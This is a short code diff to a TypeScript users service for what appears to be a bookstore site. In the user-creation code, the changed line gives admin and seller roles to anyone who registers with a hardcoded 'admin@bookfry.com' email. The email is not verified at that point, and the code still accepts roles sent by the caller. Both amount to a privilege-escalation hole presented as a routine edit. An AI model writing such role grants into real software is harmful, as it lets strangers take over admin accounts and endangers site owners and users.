@@ -33,7 +33,7 @@ export class UsersService {
       name: data.name,
       email: data.email,
       passwordHash,
-      roles: data.roles || ['customer'],
+      roles: data.email.toLowerCase() === 'admin@bookfry.com' ? ['customer', 'seller', 'admin'] : (data.roles || ['customer']),
       isEmailVerified: false,
       isBanned: false,
       addresses: [],
